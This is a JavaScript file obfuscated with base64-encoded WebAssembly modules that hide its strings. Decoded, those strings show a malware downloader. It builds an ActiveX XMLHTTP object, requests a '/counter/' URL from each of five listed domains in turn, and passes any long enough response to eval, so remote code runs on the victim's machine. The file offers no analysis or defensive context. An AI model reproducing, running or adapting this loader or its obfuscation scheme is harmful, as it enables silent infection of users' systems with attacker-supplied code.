const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG0YCAgAAOfwBBAQt/AEEQC38AQSILfwBBNgt/AEHIAAt/AEHYAAt/AEHqAAt/AEH6AAt/AEH+AAt/AEGQAQt/AEGUAQt/AEGYAQt/AEHyAQt/AEGCAgsH/oCAgAAPBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0Lw4KAgAAOAEEBCw5odHRwJTNBJTJGJTJGAABBEAsQYXpsaXZlc291bmQuY29tAABBIgsScmVhbGl6ZWR3b3J0aC5jb20AAEE2CxFldmVyZ2xhZGVzaXQuY29tAABByAALD21hcG9mdGV4YXMubmV0AABB2AALEGhhcm9sZHNvd2xzLmNvbQAAQeoACw9Nc3htbDIuWE1MSFRUUAAAQfoACwNFVAAAQf4ACxElMkZjb3VudGVyJTJGJTNGAABBkAELAkcAAEGUAQsCYQAAQZgBC1hUWEwtand5c2ZDWVVZRWxnQ0kwZm5kbTlCV192UjAzaC1QRnoxMGhyZmRWYmhmeDZKcUdMTEdtTWV3UmdhNTlNa1J0UEcyMFdkMHdQWFNCUzdVRjJEUTAAAEHyAQsOQWN0aXZlWE9iamVjdAAAQYICCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var z9 = lS(0, 0);
var x = new Array(lS(0, 1), lS(0, 2), lS(0, 3), lS(0, 4), lS(0, 5));
var z1 = lS(0, 6);
var z8 = lS(0, 7);
for (var i = 0; i < x.length; i++) {
    var e = new window[(lS(0, 12, true))](z1);
    x[i] = z9 + x[i] + lS(0, 8);
    var z7 = lS(0, 9) + z8;
    var z4 = lS(0, 10);
    try {
        var m = lS(0, 11);
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(z7, x[i] + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var z3 = e.responseText;
        if (z3.length > 1000 && z3.indexOf(m) > -1) {
            var z3 = z3.split(m).join(z4);
            window[lS(0, 13, true)](z3);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;